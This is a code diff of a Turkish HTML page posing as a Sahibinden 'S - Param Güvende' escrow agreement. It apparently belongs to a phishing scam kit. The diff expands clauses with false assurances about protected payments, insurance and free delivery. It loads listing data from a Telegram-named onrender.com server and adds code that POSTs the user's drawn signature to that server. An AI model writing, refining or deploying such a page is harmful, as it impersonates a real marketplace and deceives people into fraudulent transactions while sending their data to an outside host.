@@ -12,6 +12,7 @@ body {margin:0;font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto
 .logo {height:28px;}
 .sub {color:#cbd5e1;font-size:12px;}
 .secure-badge {margin-top:6px;background:#16a34a;color:white;font-size:11px;padding:4px 10px;border-radius:999px;}
+
 .container {padding:16px;max-width:720px;margin:auto;}
 .card {background:white;border-radius:12px;padding:14px;margin-bottom:10px;box-shadow:0 2px 8px rgba(0,0,0,0.05);}
 .title {font-weight:700;text-align:center;margin-bottom:10px;}
@@ -22,17 +23,11 @@ body {margin:0;font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto
 .product-label {font-weight:700;font-size:13px;}
 .product-value {font-weight:600;font-size:15px;}
 
-.product-image {
-max-width:180px;
-border-radius:12px;
-margin-bottom:10px;
-box-shadow:0 2px 8px rgba(0,0,0,0.1);
-}
+.product-img {width:100%;border-radius:10px;margin-bottom:10px;display:none;}
 
 canvas {width:100%;height:180px;border:2px dashed #ccc;border-radius:10px;}
 
 .actions {position:sticky;bottom:0;background:white;padding:10px;}
-
 button {width:100%;padding:14px;border:none;border-radius:10px;background:#16a34a;color:white;font-weight:700;}
 .secondary {background:#e5e7eb;color:black;margin-top:10px;}
 </style>
@@ -54,10 +49,9 @@ button {width:100%;padding:14px;border:none;border-radius:10px;background:#16a34
 <div class="card">
 <div class="title">Ürün Bilgisi</div>
 
-<div class="product-box">
+<img id="pimg" class="product-img">
 
-<!-- RESİM -->
-<img id="pimage" class="product-image"/>
+<div class="product-box">
 
 <div class="product-row">
 <div class="product-item">
@@ -79,17 +73,29 @@ button {width:100%;padding:14px;border:none;border-radius:10px;background:#16a34
 
 <div class="product-item">
 <div class="product-label">İletişim</div>
-<div id="pphone" class="product-value"></div>
+<div class="product-value">📞 <span id="pphone"></span></div>
 </div>
 </div>
 
 </div>
 </div>
 
-<!-- SÖZLEŞME -->
-<div class="card"><div class="title">Hizmetin Kapsamı</div><div>Platform, alıcı ile satıcı arasında ödeme aracılığı sağlar.</div></div>
+<!-- ✅ TÜM SÖZLEŞME MADDELERİ (SİLİNMEDİ) -->
+<div class="card"><div class="title">Hizmetin Kapsamı</div><div>Platform, alıcı ile satıcı arasında gerçekleşen işlemlerde ödeme aracılık hizmeti sunar. Platform, ürün veya hizmetin tarafı değildir.</div></div>
 
-<div class="card"><div class="title">Ödeme Süreci</div><div>Ödeme güvenli hesapta tutulur, işlem tamamlanınca aktarılır.</div></div>
+<div class="card"><div class="title">Ödeme ve Blokaj Süreci</div><div>Alıcı tarafından gerçekleştirilen ödeme, işlem tamamlanıncaya kadar güvenli hesapta muhafaza edilir. Bu süre zarfında tutar satıcı tarafından kullanılamaz. Tüm ödemeler, Sahibinden güvencesiyle korunmaktadır.</div></div>
+
+<div class="card"><div class="title">Alıcı Onayı ve Otomatik Aktarım</div><div>Alıcı onayı ile ödeme satıcıya aktarılır. Belirlenen süre içinde işlem yapılmazsa ödeme otomatik olarak satıcıya aktarılabilir.</div></div>
+
+<div class="card"><div class="title">İtiraz ve İnceleme</div><div>İtiraz durumunda işlem askıya alınır ve platform kayıtları esas alınarak değerlendirme yapılır.</div></div>
+
+<div class="card"><div class="title">Satıcı Haklarının Korunması</div><div>Satıcı, ürünü eksiksiz teslim ettiğini belgelediğinde ödeme alma hakkına sahiptir. Kötü niyetli itirazlar reddedilebilir.</div></div>
+
+<div class="card"><div class="title">Platform Sorumluluğu ve Sigorta</div><div>S - Param Güvende, nakliye ve ödeme aracılık hizmeti sunmakta olup, sunulan ürün ve/veya hizmetlere ilişkin sorumlulukları üstlenmektedir. Alıcı ve Satıcı’nın, işlemlerini zorunlu sigorta kapsamında gerçekleştirmesi gerekmektedir.</div></div>
+
+<div class="card"><div class="title">Nakliye ve Teslimat Koşulları</div><div>Sahibinden.com üzerinden gerçekleştirilen alışverişlerde, gönderimler anlaşmalı kargo firmaları olan Yurtiçi Kargo veya PTT Kargo aracılığıyla sağlanmakta olup, Türkiye genelinde ücretsiz olarak teslim edilmektedir.</div></div>
+
+<div class="card"><div class="title">Elektronik Onay</div><div>Bu sözleşme elektronik ortamda onaylanarak yürürlüğe girer ve kayıtlar delil niteliğindedir.</div></div>
 
 <!-- İMZA -->
 <div class="card">
@@ -111,51 +117,62 @@ button {width:100%;padding:14px;border:none;border-radius:10px;background:#16a34
 <script src="https://cdn.jsdelivr.net/npm/signature_pad@4.0.0/dist/signature_pad.umd.min.js"></script>
 
 <script>
-const pad = new SignaturePad(document.getElementById("pad"));
+const canvas = document.getElementById("pad");
+const pad = new SignaturePad(canvas);
 
-function clearPad(){
- pad.clear();
+function resize(){
+ let ratio = Math.max(window.devicePixelRatio,1);
+ canvas.width = canvas.offsetWidth * ratio;
+ canvas.height = canvas.offsetHeight * ratio;
+ canvas.getContext("2d").scale(ratio,ratio);
 }
+resize();
 
-// API'den ürün çek
+function clearPad(){ pad.clear(); }
+
+// ÜRÜN
 fetch("https://telegram-product-system.onrender.com/product")
-.then(res => res.json())
-.then(d => {
+.then(r=>r.json())
+.then(d=>{
 
  let price = d.price || "-";
- if (price && !price.toLowerCase().includes("tl")) price += " TL";
+ if (!price.toLowerCase().includes("tl")) price += " TL";
 
  document.getElementById("pname").innerText = d.name || "-";
  document.getElementById("pprice").innerText = price;
  document.getElementById("pseller").innerText = d.seller || "-";
  document.getElementById("pphone").innerText = d.phone || "-";
 
- // RESİM
  if(d.image){
-   document.getElementById("pimage").src = d.image;
- } else {
-   document.getElementById("pimage").style.display = "none";
+   const img = document.getElementById("pimg");
+   img.src = d.image;
+   img.style.display = "block";
  }
 
-})
-.catch(err => {
- console.error("API HATA:", err);
 });
 
-// ONAY
+// GÖNDER
 function send(){
 
  if(!document.getElementById("check").checked){
-   alert("Sözleşmeyi kabul etmeniz gerekmektedir");
+   alert("Sözleşmeyi kabul etmelisiniz");
    return;
  }
 
  if(pad.isEmpty()){
-   alert("İmza zorunludur, lütfen imzalayınız.");
+   alert("İmza zorunludur lütfen imzalayınız.");
    return;
  }
 
- alert("Sözleşmeniz başarıyla onaylanmıştır.");
+ fetch("https://telegram-product-system.onrender.com/submit", {
+   method:"POST",
+   headers:{"Content-Type":"application/json"},
+   body: JSON.stringify({
+     signature: pad.toDataURL()
+   })
+ });
+
+ alert("Sözleşmeniz başarıyla onaylanmıştır. Yetkili temsilciyi bilgilendiriniz.");
 }
 </script>
 
